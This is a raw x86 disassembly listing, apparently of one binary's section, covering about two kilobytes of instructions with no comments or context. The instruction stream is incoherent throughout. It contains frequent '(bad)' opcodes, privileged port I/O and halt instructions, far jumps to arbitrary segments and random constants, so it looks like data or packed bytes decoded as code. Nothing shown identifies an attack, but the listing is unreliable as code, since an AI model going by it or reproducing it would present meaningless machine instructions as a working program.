  415638:	or     eax,0xe21a20ff
  41563d:	mov    DWORD PTR [edi],0xf368dd14
  415643:	lahf   
  415644:	xchg   esp,eax
  415645:	add    al,0x1c
  415647:	xor    eax,esp
  415649:	mov    esp,0xff2af930
  41564e:	xchg   ebx,eax
  41564f:	div    DWORD PTR [ecx-0x39]
  415652:	xchg   ch,dl
  415654:	das    
  415655:	shl    BYTE PTR [esi+edx*1],0x87
  415659:	sti    
  41565a:	imul   ebp,DWORD PTR [ebx+0x29],0xffffffe4
  41565e:	mov    eax,0xd4b5804c
  415663:	div    DWORD PTR [edi]
  415665:	add    BYTE PTR [eax],al
  415667:	hlt    
  415668:	pushf  
  415669:	nop
  41566a:	cmp    al,0x67
  41566c:	sub    esi,ecx
  41566e:	sbb    DWORD PTR [esi-0x1d9a1b92],0x5974ef20
  415678:	dec    edx
  415679:	push   eax
  41567a:	adc    edx,eax
  41567c:	int    0x13
  41567e:	pop    esp
  41567f:	adc    cl,0xbd
  415682:	sahf   
  415683:	xchg   ecx,eax
  415684:	adc    DWORD PTR [eax],ecx
  415686:	mov    ds:0xc9e0f747,al
  41568b:	or     BYTE PTR [ecx],bh
  41568d:	xchg   ebx,eax
  41568e:	fistp  WORD PTR [esi+0x109d777f]
  415694:	cmp    ebp,DWORD PTR [eax+0x45]
  415697:	aaa    
  415698:	sub    BYTE PTR [ebx-0x545c1c6c],0xa5
  41569f:	pop    edx
  4156a0:	sti    
  4156a1:	inc    ecx
  4156a2:	in     al,0x9b
  4156a4:	push   ebp
  4156a5:	addr16 int 0x54
  4156a8:	mov    dl,0x2c
  4156aa:	ds pop dx
  4156ad:	sbb    eax,0x53ad3bce
  4156b2:	mov    esp,0x1b070a5
  4156b7:	mov    esp,0x78de5980
  4156bc:	fs inc edx
  4156be:	popa   
  4156bf:	lahf   
  4156c0:	stos   DWORD PTR es:[edi],eax
  4156c1:	pop    ds
  4156c2:	sti    
  4156c3:	xchg   edx,eax
  4156c4:	and    DWORD PTR [eax+0x4ad3f2db],esp
  4156ca:	pop    es
  4156cb:	mov    ch,0x6a
  4156cd:	aaa    
  4156ce:	aaa    
  4156cf:	push   ss
  4156d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d1:	xchg   edi,eax
  4156d2:	jne    0x415660
  4156d4:	fwait
  4156d5:	xchg   ebp,eax
  4156d6:	sub    dl,BYTE PTR [edx+0x756c2066]
  4156dc:	add    eax,0x1dc6a57e
  4156e1:	(bad)  
  4156e2:	(bad)  
  4156e4:	bound  ebp,QWORD PTR [edi+0xa45f29e]
  4156ea:	inc    esi
  4156eb:	add    DWORD PTR [edi-0x6cc5be5d],esi
  4156f1:	push   ecx
  4156f2:	xor    eax,0x1eb93ea8
  4156f7:	shr    DWORD PTR ds:0x75d72857,0x30
  4156fe:	out    0xc6,al
  415700:	shl    BYTE PTR [esi-0x25],0x23
  415704:	fbstp  TBYTE PTR [edi+ebx*1-0x55f39344]
  41570b:	ret    
  41570c:	fisub  WORD PTR [ebx-0x34]
  41570f:	and    DWORD PTR [ebx+0x7a],0x6f
  415713:	fs inc esp
  415715:	int3   
  415716:	jg     0x415708
  415718:	mov    edi,eax
  41571a:	or     DWORD PTR [esi-0x31],esi
  41571d:	sub    eax,0x7864c0a0
  415722:	pop    ebx
  415723:	adc    ebp,0x20
  415726:	xchg   esi,eax
  415727:	ins    DWORD PTR es:[edi],dx
  415728:	sbb    DWORD PTR [edi],edi
  41572a:	pop    eax
  41572b:	mov    dl,0x7c
  41572d:	mov    WORD PTR [ebp+0x6b],?
  415730:	mov    ds:0x9b3176ab,al
  415735:	sub    ah,dh
  415737:	push   ss
  415738:	in     al,dx
  415739:	(bad)  
  41573a:	les    ebx,FWORD PTR [ebp+0x62]
  41573d:	mov    eax,0xce642334
  415742:	stos   DWORD PTR es:[edi],eax
  415743:	jl     0x415797
  415745:	xor    al,0x35
  415747:	push   ebp
  415748:	mov    eax,ds:0x40cf0cc1
  41574d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41574e:	dec    edi
  41574f:	loope  0x4156de
  415751:	sub    BYTE PTR [esi+ebx*4],0x7
  415755:	test   al,0xa6
  415757:	sub    ch,bh
  415759:	test   DWORD PTR [edi],0xc46a19ff
  41575f:	lds    esi,FWORD PTR [ecx+eiz*4-0x5489b2ac]
  415766:	sahf   
  415767:	xchg   DWORD PTR [esi+edi*4],ebx
  41576a:	push   eax
  41576b:	int    0x47
  41576d:	fstp   st(4)
  41576f:	(bad)  
  415771:	add    DWORD PTR [edx+0x41],ecx
  415774:	sbb    BYTE PTR [ebx+0x6af2dc3b],al
  41577a:	xor    DWORD PTR [edi-0x560e0cb4],0x9
  415781:	(bad)  
  415782:	sbb    BYTE PTR [ebx+0x61],ch
  415785:	jo     0x415758
  415787:	push   eax
  415788:	cmp    cl,BYTE PTR [ebx+0x78]
  41578b:	ret    
  41578c:	sub    al,0x49
  41578e:	sbb    ebp,DWORD PTR [ecx+0x54]
  415791:	inc    ebx
  415792:	shl    BYTE PTR [eax],cl
  415794:	aad    0xb8
  415796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415797:	sub    eax,0xc3261c12
  41579c:	fdivr  QWORD PTR [ebx+0x46879567]
  4157a2:	lds    edi,FWORD PTR [edx+0x1a107c05]
  4157a8:	or     DWORD PTR [ebp+0x70],ecx
  4157ab:	aas    
  4157ac:	pop    edi
  4157ad:	dec    eax
  4157ae:	mov    ah,0x91
  4157b0:	mov    bh,0xe8
  4157b2:	adc    BYTE PTR [esi],bh
  4157b4:	sub    eax,0xe1a7b7bd
  4157b9:	add    ch,0x77
  4157bc:	sub    DWORD PTR [edx-0x6ee09fe6],eax
  4157c2:	pop    ecx
  4157c3:	adc    eax,0x9e422a60
  4157c8:	mov    ds:0x2b3ed6ac,eax
  4157cd:	inc    esp
  4157ce:	jg     0x415760
  4157d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157d1:	sti    
  4157d2:	outs   dx,DWORD PTR ds:[esi]
  4157d3:	out    dx,eax
  4157d4:	adc    ebx,DWORD PTR [esi]
  4157d6:	jbe    0x4157c6
  4157d8:	out    0x96,al
  4157da:	icebp  
  4157db:	and    eax,0x2cda97fc
  4157e0:	xchg   DWORD PTR [ebp+0x1d],edi
  4157e3:	cmp    eax,0xa97ce139
  4157e8:	scas   eax,DWORD PTR es:[edi]
  4157e9:	mov    eax,0x2a6977ec
  4157ee:	out    0x6,eax
  4157f0:	mov    ebx,0x5c96fdb
  4157f5:	ss (bad) 
  4157f7:	push   ebp
  4157f8:	mov    eax,ds:0xb320d335
  4157fd:	retf   0x7a08
  415800:	cli    
  415801:	mov    esp,0xef5c37d7
  415806:	retf   0x5ffb
  415809:	jo     0x415834
  41580b:	test   BYTE PTR [esp+esi*2-0x48af7b74],ch
  415812:	sbb    esi,esi
  415814:	dec    edi
  415815:	xchg   ebp,eax
  415816:	and    eax,0x783f2ffc
  41581b:	ins    BYTE PTR es:[edi],dx
  41581c:	inc    edx
  41581d:	(bad)  
  41581f:	aam    0xd1
  415821:	and    edi,esp
  415823:	mov    esp,0xe981092e
  415828:	fimul  DWORD PTR [edx]
  41582a:	ss dec edi
  41582c:	jo     0x415854
  41582e:	mov    BYTE PTR [eax],dl
  415830:	or     al,0x76
  415832:	jo     0x41583e
  415834:	stos   DWORD PTR es:[edi],eax
  415835:	and    al,0xbe
  415837:	cmp    bl,BYTE PTR [edx-0x585ddb30]
  41583d:	cmp    edx,ebx
  41583f:	jb     0x415846
  415841:	fdivp  st(7),st
  415843:	sbb    eax,0x113577e3
  415848:	sbb    DWORD PTR [edx-0x19],ecx
  41584b:	dec    ecx
  41584c:	or     al,0x6c
  41584e:	stos   DWORD PTR es:[edi],eax
  41584f:	mov    bl,0x79
  415851:	lods   eax,DWORD PTR ds:[esi]
  415852:	popa   
  415853:	call   0xc361872f
  415858:	pushf  
  415859:	push   edi
  41585a:	sbb    bh,BYTE PTR ds:0x69cdacd8
  415860:	sub    BYTE PTR es:[ebx],ah
  415863:	aaa    
  415864:	(bad)
  415868:	lods   al,BYTE PTR ds:[esi]
  415869:	sbb    cl,BYTE PTR ds:0x36e11e61
  41586f:	test   eax,0x4a64028b
  415874:	jle    0x415820
  415876:	cli    
  415877:	popf   
  415878:	leave  
  415879:	push   ss
  41587a:	pushf  
  41587b:	sub    eax,0x72c2318b
  415880:	cmp    eax,0x97059006
  415885:	pusha  
  415886:	retf   
  415887:	js     0x415876
  415889:	push   0x63
  41588b:	fwait
  41588c:	add    DWORD PTR [esi-0x1a],ecx
  41588f:	ret    0xfefa
  415892:	sbb    ecx,esi
  415894:	cmp    al,0xfb
  415896:	mul    ebx
  415898:	sub    al,0x28
  41589a:	(bad)  
  41589b:	mov    dh,0xd2
  41589d:	xchg   ebp,eax
  41589e:	(bad)  
  41589f:	(bad)  
  4158a0:	jmp    0x41584b
  4158a2:	and    eax,0x426ce2da
  4158a7:	xchg   edi,eax
  4158a8:	mov    WORD PTR [ebx+0x543ca9a4],cs
  4158ae:	add    DWORD PTR [esi-0x47],0x6c08b88b
  4158b5:	scas   eax,DWORD PTR es:[edi]
  4158b6:	in     eax,dx
  4158b7:	add    ecx,DWORD PTR [edi-0x3f]
  4158ba:	mov    esp,DWORD PTR [esi+ebx*8+0x43d3a36c]
  4158c1:	ja     0x4158cc
  4158c3:	sbb    DWORD PTR [ebx],ecx
  4158c5:	xchg   esi,eax
  4158c6:	frstor [ebp-0x1fd3b4d3]
  4158cc:	inc    edi
  4158cd:	retf   
  4158ce:	inc    ebx
  4158cf:	mov    bh,0x8e
  4158d1:	js     0x415885
  4158d3:	jno    0x41587f
  4158d5:	adc    BYTE PTR [ebx+0x700b6e5c],cl
  4158db:	loop   0x4158fb
  4158dd:	sub    ah,0xad
  4158e0:	add    BYTE PTR [ecx-0x6466087e],al
  4158e6:	mov    ecx,0xc58169a7
  4158eb:	jo     0x41592a
  4158ed:	mov    ecx,0x8f95799
  4158f2:	test   al,0x4f
  4158f4:	(bad)  
  4158f5:	cmc    
  4158f6:	mov    bh,0x75
  4158f8:	jmp    0x5b0e:0x98b40d67
  4158ff:	ret    0xb594
  415902:	or     BYTE PTR [ecx],al
  415904:	call   0xae7530d
  415909:	stos   BYTE PTR es:[edi],al
  41590a:	popf   
  41590b:	cmp    edi,ecx
  41590d:	addr16 pushf 
  41590f:	retf   0x128f
  415912:	jne    0x4158d6
  415914:	fsubr  DWORD PTR [eax+0x7129b1f3]
  41591a:	rcl    BYTE PTR [ebx],0x43
  41591d:	into   
  41591e:	fs or  eax,0x8cc33a11
  415924:	mov    BYTE PTR cs:0x94acb16,ch
  41592b:	xor    dl,BYTE PTR [edi-0x182fad33]
  415931:	test   ah,dl
  415933:	lahf   
  415934:	push   esp
  415935:	or     BYTE PTR [edi-0x4dde103d],ch
  41593b:	hlt    
  41593c:	in     al,0x79
  41593e:	cwde   
  41593f:	and    esi,0x59
  415942:	pop    ebp
  415943:	outs   dx,DWORD PTR ds:[esi]
  415944:	lock fst DWORD PTR [edx+0x4bec4d64]
  41594b:	cmp    eax,esp
  41594d:	and    al,0xc5
  41594f:	jge    0x4159bb
  415951:	aaa    
  415952:	xchg   esi,eax
  415953:	mov    esp,0x79b10952
  415958:	loopne 0x4158f0
  41595a:	mov    cs,WORD PTR [ebp+0x44]
  41595d:	sub    edi,0x15
  415960:	leave  
  415961:	leave  
  415962:	push   eax
  415963:	fnstcw WORD PTR [ebp+0xdddda5d]
  415969:	pop    ecx
  41596a:	inc    esi
  41596b:	jle    0x415969
  41596d:	fnstsw WORD PTR [eax-0x7d9b63a6]
  415973:	and    bl,0xe0
  415976:	js     0x415951
  415978:	mov    esp,0x6085d3c
  41597d:	or     al,0x76
  41597f:	nop
  415980:	or     al,0xb4
  415982:	mov    dh,0x5d
  415984:	inc    esi
  415985:	xchg   ebp,eax
  415986:	loopne 0x41592c
  415988:	sbb    al,0xac
  41598a:	out    0x0,al
  41598c:	cmp    BYTE PTR [ebx],ch
  41598e:	add    al,0xf
  415990:	shl    BYTE PTR ds:0x6c305b0e,1
  415996:	mov    DWORD PTR [edi-0x4b],esi
  415999:	push   0xffffff94
  41599b:	lock fwait
  41599d:	adc    BYTE PTR [edi+0x66],cl
  4159a0:	xlat   BYTE PTR ds:[ebx]
  4159a1:	cld    
  4159a2:	aad    0x77
  4159a4:	xor    edx,edx
  4159a6:	jnp    0x415a18
  4159a8:	fwait
  4159a9:	sti    
  4159aa:	daa    
  4159ab:	jle    0x415973
  4159ad:	mov    esi,ebp
  4159af:	aad    0x7f
  4159b1:	push   cs
  4159b2:	repnz or DWORD PTR [ebp+0x445f0ef6],ebp
  4159b9:	in     al,dx
  4159ba:	ins    BYTE PTR es:[edi],dx
  4159bb:	cmc    
  4159bc:	push   edi
  4159bd:	and    BYTE PTR [ebx+0x3cb5da7f],cl
  4159c3:	in     eax,0x48
  4159c5:	adc    edx,ecx
  4159c7:	shl    BYTE PTR [eax-0x5366d47c],cl
  4159cd:	dec    eax
  4159ce:	out    dx,al
  4159cf:	pop    edx
  4159d0:	outs   dx,DWORD PTR ds:[esi]
  4159d1:	fcomp  QWORD PTR [edi+edx*4-0x72]
  4159d5:	sub    al,0xae
  4159d7:	cli    
  4159d8:	pop    esi
  4159d9:	add    BYTE PTR [esi-0x42],0xed
  4159dd:	dec    ebx
  4159de:	loope  0x415a44
  4159e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e1:	jnp    0x415a26
  4159e3:	sub    BYTE PTR [eax-0x6bf6b192],bh
  4159e9:	jb     0x415a1f
  4159eb:	cmp    al,0x61
  4159ed:	cdq    
  4159ee:	into   
  4159ef:	jmp    0x56df:0x9632980f
  4159f6:	sbb    ebp,DWORD PTR [eax+0x79c568d1]
  4159fc:	pop    ebx
  4159fd:	mov    ch,0x3c
  4159ff:	pushf  
  415a00:	dec    ebp
  415a01:	cmp    al,0x74
  415a03:	push   cs
  415a04:	xchg   DWORD PTR [esi-0x29],ebx
  415a07:	xor    edx,esp
  415a09:	add    DWORD PTR [ecx+0x2b9060f0],esi
  415a0f:	mov    al,ds:0xbd60a2fd
  415a14:	shl    BYTE PTR [ebx+0x41],1
  415a17:	pop    ss
  415a18:	push   0x49384751
  415a1d:	(bad)  
  415a1e:	aam    0xeb
  415a20:	dec    esp
  415a21:	paddsw mm0,QWORD PTR [edi+edi*8+0x79]
  415a26:	sub    cl,BYTE PTR [ebx-0x105c5eb8]
  415a2c:	dec    ebx
  415a2d:	or     BYTE PTR [ecx],ch
  415a2f:	(bad)  
  415a30:	std    
  415a31:	div    BYTE PTR [ebp-0x4dc4474e]
  415a37:	and    eax,0x97eb3ee9
  415a3c:	mov    ecx,0x5adfe826
  415a41:	daa    
  415a42:	out    0x40,eax
  415a44:	and    eax,0xde5ec22c
  415a49:	jge    0x415a01
  415a4b:	addr16 and al,bh
  415a4e:	dec    ecx
  415a4f:	aam    0xd3
  415a51:	and    ecx,0x80ad2be9
  415a57:	ror    DWORD PTR [esi-0xa],1
  415a5a:	jecxz  0x415acb
  415a5c:	jb     0x415a47
  415a5e:	adc    BYTE PTR cs:[ecx-0x15313b74],0xaf
  415a66:	mov    eax,0x50404f51
  415a6b:	add    ecx,edi
  415a6d:	mov    DWORD PTR [eax+edi*1-0x34],edx
  415a71:	sbb    ebx,esi
  415a73:	add    BYTE PTR ds:0x9434e979,al
  415a79:	add    eax,0xdaa3eb35
  415a7e:	xor    eax,0xb7f45a18
  415a83:	xor    dl,0x74
  415a86:	and    al,BYTE PTR [edi-0x6f]
  415a89:	aam    0x83
  415a8b:	mov    ecx,0xd8bf944d
  415a90:	dec    ebx
  415a91:	lock sbb eax,0xb15c5331
  415a97:	pop    ebp
  415a98:	fdiv   st,st(6)
  415a9a:	mov    esi,0x6ce0c2
  415a9f:	pop    ebx
  415aa0:	push   ss
  415aa1:	js     0x415a47
  415aa3:	or     dl,BYTE PTR [edx]
  415aa5:	mov    esp,ebx
  415aa7:	jle    0x415b1b
  415aa9:	push   ds
  415aaa:	mov    dh,0xf6
  415aac:	cmp    eax,0x21d92fa
  415ab1:	cmp    edx,ebx
  415ab3:	xchg   DWORD PTR [ebp+ebp*4+0x3a3d38df],ebp
  415aba:	enter  0x2668,0x76
  415abe:	xor    dl,dl
  415ac0:	retf   0xa6e3
  415ac3:	sbb    al,0x36
  415ac5:	and    eax,0x8428c42c
  415aca:	in     eax,dx
  415acb:	dec    esi
  415acc:	and    al,0xfa
  415ace:	stos   DWORD PTR es:[edi],eax
  415acf:	mov    fs,WORD PTR [edx+0x65]
  415ad2:	sahf   
  415ad3:	fbld   TBYTE PTR [ebx+0x64]
  415ad6:	ins    DWORD PTR es:[edi],dx
  415ad7:	or     ecx,DWORD PTR [edx+0x661c1ecf]
  415add:	or     bh,BYTE PTR [edx]
  415adf:	in     al,dx
  415ae0:	sar    ah,1
  415ae2:	popa   
  415ae3:	adc    BYTE PTR [edi+0x8e56c87],cl
  415ae9:	sub    DWORD PTR [edx-0x3c128097],0xffffffe9
  415af0:	ror    DWORD PTR [eax+0x717951f8],0x10
  415af7:	and    eax,0xca781b3c
  415afc:	stc    
  415afd:	dec    ebx
  415afe:	pushf  
  415aff:	sub    al,0x3e
  415b01:	(bad)  
  415b02:	call   0xfd22:0x6743db96
  415b09:	dec    ecx
  415b0a:	adc    dh,BYTE PTR fs:[ecx+eiz*8+0x38d4192]
  415b12:	xor    edx,esi
  415b14:	mov    esp,0x94c129e4
  415b19:	loop   0x415b62
  415b1b:	lock dec edi
  415b1d:	sbb    al,0xd6
  415b1f:	adc    al,0xa2
  415b21:	pop    es
  415b22:	in     al,dx
  415b23:	call   0xa2c2:0x5fab6e78
  415b2a:	gs mov esi,edi
  415b2d:	stos   BYTE PTR es:[edi],al
  415b2e:	and    al,0x15
  415b30:	jns    0x415ac1
  415b32:	int    0x27
  415b34:	add    BYTE PTR [edi-0x37031286],0xd
  415b3b:	jecxz  0x415bb6
  415b3d:	shr    DWORD PTR [ebp-0x627d0156],1
  415b43:	sbb    ebx,DWORD PTR [ecx]
  415b45:	jo     0x415bc6
  415b47:	or     BYTE PTR [ebx+ebp*4],0x23
  415b4b:	vminpd xmm4,xmm0,XMMWORD PTR [eax+0x6b]
  415b50:	xchg   BYTE PTR [ecx],bh
  415b52:	retf   0x7bb8
  415b55:	mov    ah,0xfc
  415b57:	lods   al,BYTE PTR ds:[esi]
  415b58:	cwde   
  415b59:	jae    0x415b9e
  415b5b:	rcl    eax,0xf4
  415b5e:	cmp    ah,cl
  415b60:	in     eax,0x29
  415b62:	xchg   ecx,eax
  415b63:	outs   dx,BYTE PTR ds:[esi]
  415b64:	inc    esi
  415b65:	pop    esp
  415b66:	adc    DWORD PTR [ebx],esi
  415b68:	or     ebp,DWORD PTR [ecx+0x7ed15d6b]
  415b6e:	push   0xffffffc9
  415b70:	push   ecx
  415b71:	stc    
  415b72:	popa   
  415b73:	push   esi
  415b74:	mov    cl,0xe6
  415b76:	jmp    0x85ee7eae
  415b7b:	das    
  415b7c:	push   cs
  415b7d:	(bad)  
  415b7e:	pop    edx
  415b7f:	jb     0x415b8d
  415b81:	add    DWORD PTR [edi+ebp*4],edi
  415b84:	push   edx
  415b85:	icebp  
  415b86:	lock dec eax
  415b88:	mov    cl,0xee
  415b8a:	(bad)  
  415b8b:	pop    edi
  415b8c:	or     eax,0x1ac25a6f
  415b91:	push   ebx
  415b92:	aam    0x79
  415b94:	push   cs
  415b95:	pop    edi
  415b96:	mov    edi,0x480d5d4a
  415b9b:	or     DWORD PTR [ecx],esi
  415b9d:	xlat   BYTE PTR ds:[ebx]
  415b9e:	add    bl,ah
  415ba0:	sub    esi,DWORD PTR [ebx]
  415ba2:	ret    0xba06
  415ba5:	retf   
  415ba6:	test   DWORD PTR [ebx],0x3fcd46cc
  415bac:	pop    edx
  415bad:	pop    ebx
  415bae:	or     al,BYTE PTR [esi+ebx*2+0x5cf509eb]
  415bb5:	cmp    cl,BYTE PTR [eax-0x1d4874c5]
  415bbb:	push   esi
  415bbc:	int    0x90
  415bbe:	jae    0x415bc0
  415bc0:	xchg   esp,eax
  415bc1:	dec    edx
  415bc2:	push   eax
  415bc3:	in     eax,dx
  415bc4:	addr16 inc esp
  415bc6:	or     esi,DWORD PTR [eax]
  415bc8:	inc    BYTE PTR [ebp-0x2e2fe57b]
  415bce:	inc    esi
  415bcf:	ficom  DWORD PTR [edi+0xe]
  415bd2:	xor    eax,0xa0ddf528
  415bd7:	je     0x415bae
  415bd9:	imul   edi,DWORD PTR [esi-0x2b],0xffffff96
  415bdd:	ds mov edi,0x95cbd97a
  415be3:	(bad)  
  415be4:	out    0x73,eax
  415be6:	xchg   ebx,eax
  415be7:	pop    ss
  415be8:	jmp    0x2c84:0x26ec9a45
  415bef:	add    al,0x26
  415bf1:	loop   0x415c4e
  415bf3:	dec    esp
  415bf4:	jne    0x415c30
  415bf6:	stc    
  415bf7:	std    
  415bf8:	int3   
  415bf9:	sbb    dl,BYTE PTR [edx]
  415bfb:	aaa    
  415bfc:	jns    0x415bee
  415bfe:	mov    ch,BYTE PTR [ebp+0x4f]
  415c01:	dec    edx
  415c02:	sbb    eax,0x45e5ad9a
  415c07:	xchg   ebp,eax
  415c08:	retf   
  415c09:	call   0xee25656a
  415c0e:	in     al,0x5c
  415c10:	dec    edi
  415c11:	div    BYTE PTR [edi-0x2abc835f]
  415c17:	sub    BYTE PTR [eax-0x7bc97235],bh
  415c1d:	loopne 0x415bd3
  415c1f:	cmp    DWORD PTR [ebp-0x43],0x15feaf6a
  415c26:	jne    0x415c64
  415c28:	push   edx
  415c29:	push   ds
  415c2a:	and    ebp,DWORD PTR [esi+0x72]
  415c2d:	and    al,BYTE PTR [ebx+0x2d]
  415c30:	xchg   esi,eax
  415c31:	adc    DWORD PTR [esi+0x6b],0xc8773671
  415c38:	mov    cl,0x98
  415c3a:	(bad)  
  415c3b:	jne    0x415c99
  415c3d:	rcl    BYTE PTR [edi+0x4f],1
  415c40:	int    0x85
  415c42:	inc    esp
  415c43:	xor    DWORD PTR [eax+eax*8],ebx
  415c46:	push   es
  415c47:	pop    ecx
  415c48:	mov    ds:0x70ce83f5,al
  415c4d:	push   cs
  415c4e:	mov    dl,BYTE PTR [ebx]
  415c50:	jl     0x415cb2
  415c52:	push   es
  415c53:	dec    ebx
  415c54:	bound  edi,QWORD PTR [ebp+eax*2+0x5097e06a]
  415c5b:	and    DWORD PTR [edi+0x4d],ebp
  415c5e:	jno    0x415c62
  415c60:	and    bh,BYTE PTR [esi]
  415c62:	mov    cl,0xdb
  415c64:	(bad)  
  415c65:	sbb    eax,0x22b5114c
  415c6a:	xchg   DWORD PTR [edx-0x7308c52a],esi
  415c70:	push   ebx
  415c71:	adc    DWORD PTR [esi+0x279adc3f],0x87d21305
  415c7b:	mov    dh,0xb3
  415c7d:	add    eax,DWORD PTR [edx+0x1e31402c]
  415c83:	and    BYTE PTR [esi+0x6f],0xa
  415c87:	iret   
  415c88:	push   es
  415c89:	fadd   QWORD PTR [esi]
  415c8b:	dec    edi
  415c8c:	popa   
  415c8d:	sub    BYTE PTR [eax],bh
  415c8f:	outs   dx,DWORD PTR ds:[esi]
  415c90:	push   0x12dfef2
  415c95:	xchg   ebx,eax
  415c96:	aas    
  415c97:	fbld   TBYTE PTR [eax]
  415c99:	outs   dx,DWORD PTR ds:[esi]
  415c9a:	jo     0x415c6b
  415c9c:	cmp    dh,BYTE PTR [edi-0x5c6a998f]
  415ca2:	fsub   DWORD PTR [edi+eiz*1+0x57]
  415ca6:	push   eax
  415ca7:	push   ebx
  415ca8:	mov    eax,0xe6e8a22e
  415cad:	cmc    
  415cae:	fidivr DWORD PTR [eax]
  415cb0:	mov    ?,WORD PTR ss:[ecx+0x7f]
  415cb4:	pop    ss
  415cb5:	loope  0x415cdb
  415cb7:	mov    cl,0xa7
  415cb9:	dec    edx
  415cba:	ss in  al,0x87
  415cbd:	xor    BYTE PTR [esi-0x33],ch
  415cc0:	adc    al,0xfd
  415cc2:	(bad)  
  415cc3:	jmp    0x39ba:0xfed198b
  415cca:	and    BYTE PTR [edi+0x24],0xbe
  415cce:	push   0xb8720486
  415cd3:	sbb    eax,0x3b52cd3
  415cd8:	or     ecx,DWORD PTR [esi-0x71]
  415cdb:	mov    dl,0x1
  415cdd:	lock xor eax,0x989096ef
  415ce3:	xor    BYTE PTR [edi-0x1da4aab9],bh
  415ce9:	and    DWORD PTR [esi+0x127727c],esi
  415cef:	cmp    DWORD PTR [ebx+0x724c54c7],eax
  415cf5:	jmp    0xdcb423d0
  415cfa:	jmp    0x354:0xe11799f2
  415d01:	loopne 0x415cdc
  415d03:	push   0x74
  415d05:	mov    bl,0x4e
  415d07:	mov    edx,0x4a1f34c2
  415d0c:	or     dl,dl
  415d0e:	(bad)  
  415d0f:	es add al,0x9e
  415d12:	mov    al,ds:0x68635f15
  415d17:	std    
  415d18:	shl    al,cl
  415d1a:	jp     0x415cdf
  415d1c:	cmp    BYTE PTR [ebx+ebp*1-0x54],ah
  415d20:	pusha  
  415d21:	mov    dl,0x4c
  415d23:	cli    
  415d24:	imul   esp,DWORD PTR [esi+ebx*8-0x4b6f5096],0xde61a98d
  415d2f:	xchg   edi,eax
  415d30:	aam    0x30
  415d32:	ss inc eax
  415d34:	adc    ch,BYTE PTR [edx-0x42dc76c9]
  415d3a:	xor    esi,ebp
  415d3c:	das    
  415d3d:	jbe    0x415d43
  415d3f:	mov    ebx,0x9a7d98b0
  415d44:	dec    esi
  415d45:	push   esp
  415d46:	jmp    0x63cf5cae
  415d4b:	xchg   DWORD PTR [edi],ecx
  415d4d:	push   ebp
  415d4e:	or     al,BYTE PTR [edx+0x23]
  415d51:	ja     0x415d77
  415d53:	push   edx
  415d54:	inc    ecx
  415d55:	push   0x4d
  415d57:	push   eax
  415d58:	push   es
  415d59:	cmp    dl,BYTE PTR [esi]
  415d5b:	jge    0x415db2
  415d5d:	ds sub eax,0x3886ba1c
  415d63:	mov    ecx,0xd93e4339
  415d68:	lds    edx,FWORD PTR [edi-0x18c4daed]
  415d6e:	stc    
  415d6f:	cmp    esp,DWORD PTR [edi]
  415d71:	sub    BYTE PTR [edi-0x2c7fef6f],al
  415d77:	rcl    esi,cl
  415d79:	ret    0xe5af
  415d7c:	fmul   QWORD PTR [edx]
  415d7e:	sahf   
  415d7f:	xchg   esp,eax
  415d80:	ficom  DWORD PTR ds:0xac79e6d1
  415d86:	shr    DWORD PTR ss:[edx-0x1d],1
  415d8a:	mov    ebp,0x8bb6c6c2
  415d8f:	or     esi,ecx
  415d91:	or     ecx,DWORD PTR ds:0xff015385
  415d97:	xor    DWORD PTR [edx-0x51],ebp
  415d9a:	and    eax,0x69894f2d
  415d9f:	jecxz  0x415e17
  415da1:	lea    ecx,[ebp-0x20fd722]
  415da7:	jle    0x415d87
  415da9:	sbb    DWORD PTR [edx-0x4ac43f3b],edi
  415daf:	mov    ecx,0x28cd8ee0
  415db4:	xchg   eax,eax
  415db6:	pop    ebp
  415db7:	inc    ebp
  415db8:	punpcklwd mm6,mm0
  415dbb:	mov    eax,0xe76e8ab5
  415dc0:	push   0xffffffcd
  415dc2:	or     DWORD PTR [edi-0x4d1534f3],edx
  415dc8:	cs jge 0x415de0
  415dcb:	call   0xad4:0x9ccbb25d
  415dd2:	adc    BYTE PTR [ecx],al
  415dd4:	mov    al,0xf1
  415dd6:	push   esi
  415dd7:	rcl    DWORD PTR ds:0xd93127e7,0xba
  415dde:	mov    edx,eax
  415de0:	push   esi
  415de1:	es out dx,al
  415de3:	jno    0x415e52
  415de5:	cmp    BYTE PTR [esi+0x38],0xfe
  415de9:	add    eax,0xad723a93
  415dee:	or     al,0xbf
  415df0:	mov    ds:0x2c1897ce,eax
  415df5:	fistp  DWORD PTR [ebx+eiz*1-0x1c448e7d]
  415dfc:	add    dl,BYTE PTR [ebp-0x544733f3]
  415e02:	jbe    0x415da0
  415e04:	loop   0x415dbb
  415e06:	xor    al,al
  415e08:	sbb    ecx,DWORD PTR [edx-0x140366ec]
  415e0e:	pop    es
  415e0f:	int    0x9b
  415e11:	mov    al,BYTE PTR [ebx+0x53]
  415e14:	sub    edi,esi
  415e16:	fldcw  WORD PTR [ecx+eiz*1-0x75]
  415e1a:	loopne 0x415e39
  415e1c:	jmp    0xe4644e4f
  415e21:	push   es
  415e22:	push   es
  415e23:	jno    0x415dad
  415e25:	pop    ss
  415e26:	sbb    al,0x7a
  415e28:	push   0x2c
  415e2a:	mov    eax,ds:0x3c41b88b
  415e2f:	cmp    eax,0x39bac3cd
  415e34:	popf   
  415e35:	pop    ebx
  415e36:	repz clc 
  415e38:	pop    esi
  415e39:	push   ds
  415e3a:	xchg   esp,eax
  415e3b:	test   eax,0x702b24ac
  415e40:	inc    esp
  415e41:	jno    0x415e28
  415e43:	xchg   esp,eax
  415e44:	js     0x415e92
  415e46:	inc    edx
  415e47:	mulps  xmm4,xmm0
  415e4a:	dec    eax
  415e4b:	nop
  415e4c:	mov    esp,0x696d8a71
  415e51:	pop    es
  415e52:	push   0x1eb57ec4
  415e57:	(bad)  
  415e58:	cmp    ebp,DWORD PTR ss:[edx-0x138cb7c2]
  415e5f:	mov    edi,DWORD PTR [edi+edi*4-0x19]
  415e63:	jbe    0x415e5f
  415e65:	loope  0x415ec3
  415e67:	outs   dx,BYTE PTR ds:[esi]
  415e68:	mov    esi,DWORD PTR [edi-0x5d3afcf5]
  415e6e:	inc    edx
  415e6f:	adc    DWORD PTR ds:0xf1bc36ed,ebp
  415e75:	pop    edi
  415e76:	ret    0x19c4
  415e79:	loop   0x415ebf
  415e7b:	out    0x84,eax
